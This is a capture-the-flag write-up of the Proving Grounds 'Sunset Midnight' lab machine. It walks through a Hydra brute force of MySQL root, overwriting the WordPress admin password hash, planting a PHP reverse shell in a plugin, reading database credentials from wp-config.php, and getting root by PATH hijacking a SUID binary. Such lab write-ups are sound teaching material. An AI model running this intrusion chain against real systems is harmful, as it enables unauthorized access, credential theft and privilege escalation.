---
layout: default
title: Sunset Midnight
parent: Proving Grounds Play
nav_order: 11
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.243.88
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 15:57 EST
Nmap scan report for 192.168.243.88
Host is up (0.070s latency).
Not shown: 64816 closed tcp ports (reset), 716 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
|_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: Did not follow redirect to http://sunset-midnight/
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, LongColumnFlag, InteractiveClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: RNm[`PQ&dJ$q1=|}~$4t
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.90 seconds

```

# Enumeration

---

## 3306 | MySQL

Run Hydra against the mysql service with the _root_ username.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.243.88 mysql
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-05 16:11:17
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.243.88:3306/
[3306][mysql] host: 192.168.243.88   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-05 16:11:26

```

We get the credential _root:robert_

Authenticate to the MySQL service to enumerate additional user credentials.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ mysql -u root -p -h 192.168.243.88
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1747
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>

```

Show databases.

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.077 sec)

```

Use the _wordpress_db_ database and list tables.

```bash
MariaDB [(none)]> use wordpress_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

showDatabase changed
MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+
13 rows in set (0.058 sec)

```

Select all rows in the _wp_users_ table

```bash
MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.062 sec)

```

We have root access to the _wp_users_ table and can change the admin password to an MD5 hash.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ echo -n password | md5sum
5f4dcc3b5aa765d61d8327deb882cf99  -

# Change the admin user password to the MD5 hash above

MariaDB [wordpress_db]> UPDATE wp_users SET user_pass="5f4dcc3b5aa765d61d8327deb882cf99" WHERE ID=1;
Query OK, 1 row affected (0.059 sec)
Rows matched: 1  Changed: 1  Warnings: 0

# Validate the admin user hash has changed to the value we set

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.056 sec)



```

## 80 | HTTP

We recieve a browser error and an attempt to resolve _http://sunset-midnight_

Update the _/etc/hosts_ file with an entry for _sunset-midnight_

```bash
sudo vim /etc/hosts

# Upate /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali.'"''       kali

192.168.243.88 sunset-midnight

```

This appears to be a wordpress site.

![wp_admin](../../../assets/images/ctfs/proving_grounds/sunset_midnight/wp_admin.png)

### Wpscan

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ wpscan --url http://192.168.243.88/ --enumerate p --plugins-detection aggressive

[+] WordPress theme in use: twentyseventeen
 | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured image
s. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version:
2.3'
```

# Exploitation

---

Authenticate to the Wordpress site with the credentials _admin:password_ that we set in the MySQL section above.

Navigate to the _plugin editor_

![plugin_editor](../../../assets/images/ctfs/proving_grounds/sunset_midnight/plugin_editor.png)

Select the _Hello Dolly_ plugin to edit.

![hello_dolly](../../../assets/images/ctfs/proving_grounds/sunset_midnight/hello_dolly.png)

Insert the Pentest Monkey's PHP reverse shell script into the _hello.php_ file just after the commented out text.

Make sure to delete the PHP tags from the PHP reverse shells script being inserted into the _hello.php_ file.

[PHP reverse shell raw code](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

![hello_edit](../../../assets/images/ctfs/proving_grounds/sunset_midnight/hello_edit.png)

![update_file](../../../assets/images/ctfs/proving_grounds/sunset_midnight/update_file.png)

Navigate to the installed plugins menu.

![installed_plugins](../../../assets/images/ctfs/proving_grounds/sunset_midnight/installed_plugins.png)

Activate the _Hello Dolly_ plugin.

![activate](../../../assets/images/ctfs/proving_grounds/sunset_midnight/activate.png)

Receive a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.243.88] 45046
Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 21:54:35 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Post-Exploitation

---

## Read the contents of wp-config.php

Locate the password for _jose_ in the _wp-config.php_ file

```bash
www-data@midnight:/var/www/html/wordpress$ cat wp-config.php

/** MySQL database username */
define( 'DB_USER', 'jose' );

/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );


```

## Pivot to Jose via SU Command

Use _su_ comman to switch to _jose_ uer

```bash
www-data@midnight:/var/www/html/wordpress$ su jose
Password:
jose@midnight:/var/www/html/wordpress$ id
uid=1000(jose) gid=1000(jose) groups=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

```

## Check SUDO Permissions for Jose

Jose cannot run sudo on the target machine

## Check SUID Bits

```bash
jose@midnight:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/status
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```

## Exploit /usr/bin/status

Running _strings_ on the _/usr/bin/status_ binary we can see that _service ssh status_ is being called.

Since the binary is calling _service_ without specifying the path we can create our own malicious _service_ binary.

We can then execute the malicious _service_ binary by change the PATH variable to first execute binaries in the _/tmp_ directory.

```bash
jose@midnight:/var/www/html/wordpress$ echo "/bin/sh" > /tmp/service
jose@midnight:/var/www/html/wordpress$ chmod +x /tmp/service
jose@midnight:/var/www/html/wordpress$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
jose@midnight:/var/www/html/wordpress$ export PATH=/tmp/:$PATH
jose@midnight:/var/www/html/wordpress$ /usr/bin/status

# Show we are now root
> id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)

```
